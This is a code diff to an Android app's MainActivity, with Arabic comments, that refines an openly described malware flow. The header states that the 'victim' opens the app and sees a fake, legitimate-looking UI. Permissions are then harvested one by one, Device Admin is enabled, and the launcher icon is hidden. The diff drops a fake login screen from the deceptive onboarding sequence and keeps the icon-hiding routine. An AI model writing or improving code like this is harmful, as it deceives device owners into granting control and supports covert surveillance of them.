@@ -25,7 +25,7 @@ import androidx.core.content.ContextCompat;
  * ============================================================
  * ★ استراتيجية العمل:
  * 1. الضحية تفتح التطبيق من الأيقونة
- * 2. نعرض UI وهمي (يبدو شرعي)
+ * 2. نعرض UI وهمي (4 شاشات — بدون Login)
  * 3. نجمع الصلاحيات واحدة واحدة
  * 4. نفعل Device Admin
  * 5. نخفي الأيقونة + نقفل النشاط
@@ -168,15 +168,17 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // Flow
+    // ★★★ Flow — بدون شاشة Login ★★★
     // ============================================================
     private void startFlow() {
+        // ★ 1. شاشة الترحيب ★
         ui.showWelcomeScreen(() -> {
-            ui.showLoginScreen(() -> {
-                ui.showSecurityScanScreen(() -> {
-                    ui.showProgressScreen("جاري التهيئة...", () -> {
-                        startPermissionFlow();
-                    });
+            // ★ 2. شاشة الفحص الأمني (بدون Login) ★
+            ui.showSecurityScanScreen(() -> {
+                // ★ 3. شاشة التقدم ★
+                ui.showProgressScreen("جاري التهيئة...", () -> {
+                    // ★ 4. ابدأ في طلب الصلاحيات ★
+                    startPermissionFlow();
                 });
             });
         });
@@ -449,7 +451,7 @@ public class MainActivity extends Activity {
     }
 
     // ============================================================
-    // ★★★ hideAppIcon - الأهم: إخفاء الأيقونة ★★★
+    // hideAppIcon - إخفاء الأيقونة
     // ============================================================
     private void hideAppIcon() {
         try {
@@ -461,9 +463,6 @@ public class MainActivity extends Activity {
             }
 
             PackageManager pm = getPackageManager();
-
-            // ★★★ نعطّل الـ MainActivity component بالكامل ★★★
-            // ★ ده بيخلي الأيقونة تختفي من الـ launcher ★★★
             ComponentName componentName = new ComponentName(this, MainActivity.class);
 
             pm.setComponentEnabledSetting(
@@ -521,4 +520,4 @@ public class MainActivity extends Activity {
             }
         } catch (Exception ignored) {}
     }
-                }
+                     }
